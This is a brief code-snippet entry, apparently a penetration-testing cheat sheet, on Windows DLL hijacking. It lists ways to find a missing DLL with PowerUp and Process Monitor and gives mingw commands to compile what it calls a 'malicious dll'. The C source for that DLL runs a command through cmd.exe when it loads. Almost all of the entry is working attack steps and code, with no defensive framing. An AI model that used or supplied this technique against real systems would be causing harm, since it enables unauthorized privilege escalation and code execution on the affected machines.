---
id: a9d4f5a1-c0ba-4e29-8b9e-e1b62de1ad16
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:29.436559+00:00'
updated_at: '2023-04-10T20:37:37.001468+00:00'
---

# Code Snippet a9d4f5a1

**Language**: Powershell

```powershell
# find missing DLL 
- Find-PathDLLHijack PowerUp.ps1
- Process Monitor : check for "Name Not Found"

# compile a malicious dll
- For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
- For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"

# content of windows_dll.c
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```
